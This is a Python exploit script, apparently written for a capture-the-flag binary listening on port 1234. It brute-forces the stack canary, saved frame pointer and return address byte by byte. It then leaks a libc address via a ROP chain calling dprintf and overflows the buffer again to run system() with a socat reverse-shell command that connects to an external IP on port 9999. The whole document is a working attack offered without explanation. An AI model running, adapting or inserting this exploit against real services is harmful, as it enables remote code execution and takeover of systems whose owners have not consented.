#!/usr/bin/env python2
#-*- coding:utf-8 -*-
from zio import *

canary_value = 0
save_rbp = 0
ret_address = 0
ip = '127.0.0.1'
#ip = '10.10.10.128'
payload = "A"*8200

def my_hex(byte):
	result = hex(byte)[2:4]
	if len(result) < 2:
		result = "0" + result
	return result

def a_byte(num):
	global payload
	address = 0
	while address <= 255:
		io = zio((ip, 1234), timeout = 100000, print_read = REPR, print_write = COLORED(REPR))
		io.write(payload + chr(address) )
		io.read_until('thanks.')
		io.readline()
		data = io.readline()
		if data != '':
			payload += chr(address)
			result = my_hex(address)
			#log("address_"+ str(num) + ": " + result, 'red')
			return result
		address += 1

def byte_by_byte():
	global canary_value, save_rbp, ret_address
	address = []
	for i in range(8):
		address.append(a_byte(i))
	address.reverse()
	result = ''.join(address)
	if canary_value == 0:
		canary_value = int(result, 16)
		#log("canary: 0x" + result, 'red')
	elif save_rbp == 0:
		save_rbp = int(result, 16)
		#log("save_rbp: 0x" + result, 'red')
	else:
		ret_address = int(result[0:14] + "15", 16)
		#log("ret_address: 0x" + result, 'red')

#leak canary, rbp, ret_address
for x in range(3):
	byte_by_byte()
log("----------result----------", 'blue')
log("canary: " + hex(canary_value), 'red')
log("save_rbp: " + hex(save_rbp), 'red')
log("ret_address: " + hex(ret_address), 'red')

#get libc_addr
log("----------get libc_addr----------", 'blue')
base_addr = ret_address - 0xe15
log("base_addr: " + hex(base_addr), 'red')
dprintf_got = 0x202040
log("dprintf_got: " + hex(dprintf_got), 'red')
fd = 0x4
io = zio((ip, 1234), timeout = 100000, print_read = REPR, print_write = COLORED(REPR))

payload = "A"*8200 + l64(canary_value) + l64(save_rbp) + l64(base_addr+0xec6) + "A"*8 + l64(0x0) +\
			"A"*8 + l64(base_addr+dprintf_got) + "A"*8 + l64(base_addr+dprintf_got) + l64(fd) +\
			l64(base_addr+0xeb0)
io.write(payload)
io.read_until('thanks.\n')
dprintf_addr = l64(io.readline().ljust(8, '\x00'))
log("dprintf_addr: " + hex(dprintf_addr), 'red')


# # local
# dprintf_offset = 0x4E640
# system_offset = 0x3FF80
# binsh_offset = 0x14C28D
#server
dprintf_offset = 0x50A70
system_offset = 0x417D0
binsh_offset = 0x160692

libc_addr = dprintf_addr - dprintf_offset
system_addr = libc_addr + system_offset
binsh_addr = libc_addr + binsh_offset
log("libc_addr: " + hex(libc_addr), 'red')
log('system_addr: ' + hex(system_addr), 'red')
log('binsh_addr: ' + hex(binsh_addr), 'red')


# get shell
io = zio((ip, 1234), timeout = 100000, print_read = REPR, print_write = COLORED(REPR))
# #local
# payload = "socat tcp-connect:10.10.10.130:9999 exec:'bash -li',pty,stderr,setsid,sigint,sane" + "\x00"*(8200-81) +\
# 		l64(canary_value) + l64(save_rbp) + l64(libc_addr+0xDC0E9) + l64(system_addr) + l64(save_rbp-0x70-0x2000)

#server
payload = "socat tcp-connect:115.29.191.81:9999 exec:'bash -li',pty,stderr,setsid,sigint,sane" + "\x00"*(8200-82) +\
		l64(canary_value) + l64(save_rbp) + l64(libc_addr+0xE5D19) + l64(system_addr) + l64(save_rbp-0x70-0x2000)

io.write(payload)
io.readline()
io.readline()
